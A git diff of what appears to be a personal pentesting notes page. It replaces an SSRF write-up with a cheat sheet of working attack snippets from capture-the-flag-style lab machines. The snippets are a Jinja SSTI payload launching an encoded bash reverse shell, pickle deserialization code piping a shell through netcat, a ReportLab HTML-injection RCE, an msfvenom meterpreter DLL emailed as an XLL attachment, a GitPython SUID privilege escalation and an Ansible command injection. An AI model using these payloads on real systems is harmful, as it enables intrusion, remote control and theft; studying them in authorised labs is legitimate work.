@@ -4,106 +4,204 @@ date: 2024-08-21
 ---
 
 
-Resources 
-- https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
-- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
-# Flask Proxy
+Overall I learned a lot and these are some of my favorite snippets that i definitely will be keeping. SPOILERS REMOVED don't worry.
 
-A snippet taken straight from the article shows us this
+## SSTI With Jinja
 
-> [!NOTE]
-> *My first thought was: "What if the developer forgets to add the last slash in the `SITE_NAME` variable?". And yes, it can lead to an SSRF.*
-> 
-> *Since Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.*
-> 
-> *Please consider the following source code as a reference for the exploitation scenario:*
-> 
-> ```
-> from flask import Flask
-> from requests import get
-> 
-> app = Flask('__main__')
-> SITE_NAME = 'https://google.com'
-> 
-> @app.route('/', defaults={'path': ''})
-> @app.route('/<path:path>')
-> 
-> def proxy(path):
->   return get(f'{SITE_NAME}{path}').content
-> 
-> if __name__ == "__main__":
->     app.run(threaded=False)
-> ```
-> 
-> *Presented below is an example of an exploitation request:*
-> 
-> 
-> ```
-> GET @evildomain.com/ HTTP/1.1
-> Host: target.com
-> Connection: close
-> ```
-> 
-> *In the following example, I was able to fetch my EC2 metadata:*
-> 
+Context: Obtaining Foothold using Server Side Template Injection with Jinja
 
-# Let's give it a whirl shall we?
+I can see that I can by pass with this payload
 
-Looking at the code we clearly need to reach the `/enviroment` endpoint and it looks to be at the `/debug` route. 
-
-```
-GET /?url=@127.0.0.1:1337/debug/environment
+```html
+invoice_id=&form_type=scannable_invoice&qr_link=https%3A%2F%2Fbruhaps.htb%2Fstatic%2Fqr_code%2Fqr_code_5868828307.png" {{'><script>;</script>'|safe}}
 ```
 
-result
-
+### Final SSTI Payload
 ```
-HTTP/1.1 403 FORBIDDEN
-Server: Werkzeug/3.0.0 Python/3.12.0
-Date: Wed, 22 May 2024 04:17:03 GMT
-Content-Type: application/json
-Content-Length: 24
-Connection: close
-
-{"error":"Not Allowed"}
+invoice_id=&form_type=scannable_invoice&qr_link={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQ7IC9iaW4vc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash")["read"]() %} a {% endwith %}
 ```
 
-As we can see this did not work so searching through the provided files we can see this.
+On attack machine
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+
+connect to [10.10.14.7] from (UNKNOWN) [10.10.11.12] 46716
+
+ls
+app.py
+static
+templates
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@cheeese:/opt/app$ ls
+```
+
+
+---
+## Pickle RCE
+
+Context: This was a machine learning server, and I was a low privilege user related to the ML training.
+
+https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/
+
+```
+import pickle import base64 import os class RCE: def __reduce__(self): cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f') return os.system, (cmd,) if __name__ == '__main__': pickled = pickle.dumps(RCE()) print(base64.b64encode(pickled)) # or print(base64.urlsafe_b64encode(pickled))
+```
+
+### Final Python RCE
 
 ```python
-RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
+from clearml import Task
+import pickle,os
 
-def is_safe_url(url):
-    for restricted_url in RESTRICTED_URLS:
-        if restricted_url in url:
-            return False
-    return True
+class RunCommand:
+    def __reduce__(self):
+        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.16 4444 >/tmp/f',))
 
-def is_from_localhost(func):
-    @functools.wraps(func)
-    def check_ip(*args, **kwargs):
-        if request.remote_addr != '127.0.0.1':
-            return abort(403)
-        return func(*args, **kwargs)
-    return check_ip
 
-```
+command = RunCommand()
 
-## SSRF URL ByPass
 
-https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
+task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"], output_uri=True)
 
-From this we can try replacing `127.0.0.1` with any of the payloads. Let's try `@0`
+task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
+
+
+with open('pickle_artifact.pkl','wb') as f:
+    pickle.dump(command,f)
 
 ```
-GET /?url=@0:1337/debug/environment 
+
+---
+## RCE Via Html Injection
+
+Context: Obtain Foothold using Htmli
+
+https://github.com/Sudistark/BB-Writeups/blob/main/2023/CVE-2023-33733-rce-via-htmli-in-reportlab.md
+
+Start Listener
+
+```
+nc -lvnp 4444
+```
+
+Payload used for rev shell
+
+```html
+ASSS<font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlBASE64PAYLOADAKQA=') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+                exploit
+</font>
+```
+
+---
+## Sending a malicious XLL via email
+
+Context: Obtaining Foothold by sending an email allowing excel files. 
+
+https://github.com/edparcell/HelloWorldXll
+
+Generate payload with msfvenom
+```bash
+ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.68 LPORT=4444 -f dll -o ex.dll
+
+
+cp ex.dll ex.xll
 ```
 
 
-![[Assets/Pasted image 20240521230536.png]]
+Send the malicious `.xll`
+```bash
+swaks --to accounts@BRUH.htb --from assinine@BRUH.htb --server MAINFRAME.BRUH.htb --port 25 --header "Subject: test" --body "test" --attach @ex.xll
+```
 
-## PS
-Another cool one that worked was 
+
+```cmd
+C:\>whoami
+whoami
+AHHHHH YOU THOUGHT
 ```
-GET /?url=@2130706433:1337/debug/environment
+
+---
+
+## Priv Esc with GitPython
+
+Context: User Foothold obtaining root.
+
+Prod Perms
+
 ```
+User prod may run the following commands on BRUH:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+```
+
+Contents of `clone_prod_change.py`
+
+```python
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+https://github.com/gitpython-developers/GitPython/issues/1515
+https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+
+```
+'ext::sh -c chmod% 4777% /bin/bash'
+```
+
+
+## Root
+
+```
+prod@linux:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
+bash-5.1# cat /root/root.txt
+SECRET
+bash-5.1# 
+```
+
+---
+
+## Root with Ansible
+
+Context: I had perms for Ansible runner.
+### Find Ansible Hash
+```C
+// Version : 1 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <dirent.h> #include <openssl/md5.h> #define INVENTORY_FILE "/opt/playbooks/inventory.ini" #define PLAYBOOK_LOCATION "/opt/playbooks/" #define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook" #define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy" #define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed" int check_auth(const char* auth_key) { unsigned char digest[MD5_DIGEST_LENGTH]; MD5((const unsigned char*)auth_key, strlen(auth_key), digest); char md5_str[33]; for (int i = 0; i < 16; i++) { sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]); }
+```
+
+### Crack the Ansible hash
+```
+hashcat -a3 -m0 myhash.txt UH4565jkl?u?u?u?u --self-test-disable
+```
+
+```
+HASH:RESult
+```
+
+### Root Access
+
+Create json file and insert command injection.
+
+```json
+{
+ "run": {
+    "action": "install",
+    "role_file": "archive.tar;bash"},
+ "auth_code": "CRACKEDRESULT"
+}
+```
+
+*fin*
